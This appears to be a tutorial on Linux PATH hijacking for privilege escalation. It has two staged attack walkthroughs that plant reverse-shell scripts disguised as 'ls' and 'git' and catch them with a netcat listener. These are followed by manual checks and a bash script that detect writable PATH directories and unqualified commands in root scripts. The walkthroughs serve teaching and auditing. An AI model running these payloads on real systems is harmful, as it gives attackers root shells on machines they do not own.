========================================================================================================================
Adding a Malicious Directory to PATH

1. Set Up the Target Script (Run as Root)â€¨Create a sample script that the root user might run periodically:
sudo bash -c 'echo -e "#!/bin/bash\nls -la /root" > /usr/local/bin/backup.sh'
sudo chmod +x /usr/local/bin/backup.sh

2. Prepare the Malicious Command (Run as Attacker)â€¨Create a fake ls command that gives you a reverse shell:
mkdir /tmp/malicious_path
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1' > /tmp/malicious_path/ls
chmod +x /tmp/malicious_path/ls

3. Modify the PATH (Run as Attacker)â€¨Add your malicious directory to the beginning of the PATH:
export PATH=/tmp/malicious_path:$PATH

4. Trigger the Script (Run as Root)â€¨Simulate the root user running the vulnerable script:
sudo /usr/local/bin/backup.sh

5. Catch the Shell (Run on Your Machine)â€¨Start a listener on your machine:
nc -lvnp <YOUR_PORT>

Requirments
------------------------------------------------------------------------
âœ… The script must run as root
âœ… The script uses a command (ls) without full path (e.g., ls, not /bin/ls)
âœ… The attacker can create a malicious version of the command (ls)
âœ… The attacker can insert their directory at the beginning of the PATH (e.g., export PATH=/tmp/...:$PATH)
âœ… The attacker controls the shell environment in which the script is run, or the script is executed in a vulnerable context (like a cronjob using attacker-controlled $PATH)

========================================================================================================================
Hijacking an Existing Writable Directory in PATH

1. Find a Writable Directory in PATH (Run as Attacker)
echo $PATH
find /usr/local/bin -type d -writable 2>/dev/null

2. Plant the Malicious Command (Run as Attacker)â€¨If /usr/local/bin is writable, place your malicious command there:
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1' > /usr/local/bin/git
chmod +x /usr/local/bin/git

3. Catch the Shell (Run on Your Machine)â€¨Start your listener:
nc -lvnp <YOUR_PORT>

4. Trigger the Attack (Run as Root)â€¨Simulate the root user running git:
sudo git --version

Requirments
------------------------------------------------------------------------
âœ… A directory in $PATH is world-writable or attacker-writable
âœ… The command being hijacked (git) is executed by root without full path (e.g., just git)
âœ… The attacker can create and make a fake binary (git) executable
âœ… The command is run as sudo or by a script executed by root

========================================================================================================================
âœ… Steps to Check for PATH Hijacking Vulnerability

ðŸ”¹ 1. List All Directories in $PATH
        echo $PATH
        Purpose: See where the system looks for executables.
Look for: Any unusual or writable directories (e.g., /tmp, /home/user/bin, etc.)

ðŸ”¹ 2. Check for Writable Directories in $PATH

        IFS=':' read -ra dirs <<< "$PATH"
        for dir in "${dirs[@]}"; do
          [ -d "$dir" ] && [ -w "$dir" ] && echo "[!] Writable: $dir"
        done

Vulnerable if: Any of these directories are writable by non-root users.
Exploitable if: Attacker can drop a fake binary there.

ðŸ”¹ 3. Check for Root or Cron Scripts Using Unqualified Commands
Search for commands like ls, cp, git, etc. without absolute paths:

        grep -RE '^\s*[a-zA-Z0-9_-]+\s' /usr/local/bin /etc/cron* /root 2>/dev/null | grep -v '/'

Vulnerable if: A root-owned script uses ls instead of /bin/ls, etc.
These commands will resolve using $PATH.

ðŸ”¹ 4. Check Cron Jobs for PATH Issues

    sudo grep -r 'PATH=' /etc/cron*

Vulnerable if:
$PATH is set insecurely (e.g., includes /tmp)
Commands in cron scripts rely on unqualified binaries.

ðŸ”¹ 5. Check for Sudo Misconfigurations (Optional)

    sudo -l

Vulnerable if:
    You can run a command as root that internally uses unqualified commands.
    You can run scripts/binaries that trust your $PATH.

ðŸ”¹ 6. Simulate a Hijack in a Test Directory (Optional, Safe)
Create a fake ls to test if a script uses it:

    mkdir /tmp/testpath
    echo -e '#!/bin/bash\necho "Fake ls executed!"' > /tmp/testpath/ls
    chmod +x /tmp/testpath/ls
    export PATH=/tmp/testpath:$PATH
    ls

If you see "Fake ls executed!", you know the shell used your fake binary.
If root does something similar, it could be exploited.


========================================================================================================================
Script:
--------------------------------------------------------------
#!/bin/bash

echo "[*] Checking for potential PATH hijacking vulnerabilities..."

# 1. Find writable directories in current PATH
echo -e "\n[+] Writable directories in \$PATH:"
vuln_dirs=0
IFS=':' read -ra dirs <<< "$PATH"
for dir in "${dirs[@]}"; do
    if [ -w "$dir" ] && [ -d "$dir" ]; then
        echo "  [!] Writable: $dir"
        vuln_dirs=$((vuln_dirs+1))
    fi
done
if [ $vuln_dirs -eq 0 ]; then
    echo "  [-] No writable directories in PATH found."
fi

# 2. Check for root-owned scripts that use unqualified command names
echo -e "\n[+] Searching for root scripts with unqualified commands..."

tmpfile=$(mktemp)
find /usr/local/bin /usr/bin /root /etc/cron* -type f -executable -user root 2>/dev/null | while read -r script; do
    # Look for commands like "ls", "cp", "git", etc. without slashes
    grep -E '^\s*[a-zA-Z0-9_-]+\s' "$script" 2>/dev/null | grep -v '/' >> "$tmpfile"
done

if [ -s "$tmpfile" ]; then
    echo "  [!] Potential unqualified commands found in root-owned scripts:"
    sort -u "$tmpfile" | head -n 20
else
    echo "  [-] No unqualified commands found in root scripts."
fi
rm "$tmpfile"

# 3. Warn about danger
if [ $vuln_dirs -gt 0 ]; then
    echo -e "\n[!] System may be vulnerable to PATH hijacking if root runs unqualified commands."
    echo "[!] Attackers could drop fake binaries into writable PATH directories."
else
    echo -e "\n[+] No immediate PATH hijack risk found."
fi

